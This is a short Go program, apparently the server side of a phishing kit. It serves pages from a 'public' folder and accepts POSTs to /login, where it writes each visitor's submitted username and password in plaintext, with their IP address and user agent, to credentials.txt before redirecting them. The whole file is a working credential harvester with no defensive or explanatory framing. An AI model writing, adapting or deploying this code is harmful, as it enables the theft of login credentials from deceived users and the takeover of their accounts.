package main

import(
	"fmt"
	"net/http"
	"github.com/gorilla/mux"
	"os"
	log "github.com/sirupsen/logrus"
	"time"
)

func main()  {
	f, err := os.OpenFile("credentials.txt", os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0600)
	if err != nil {
		panic(err)
	}
	defer f.Close()
	log.SetOutput(f)

	r := mux.NewRouter()
	r.HandleFunc("/login", login).Methods("POST")
	r.PathPrefix("/").Handler(http.FileServer(http.Dir("public")))
	log.Fatal(http.ListenAndServe(":8080", r))
}

func login(w http.ResponseWriter, r *http.Request) {
	fmt.Println("Login attempt")
	log.WithFields(log.Fields{
		"time": time.Now().String(),
		"username": r.FormValue("_user"),
		"password": r.FormValue("_pass"),
		"user_agent": r.UserAgent(),
		"ip_address": r.RemoteAddr,
	}).Info("login attempt")
	http.Redirect(w, r, "/", 302)


}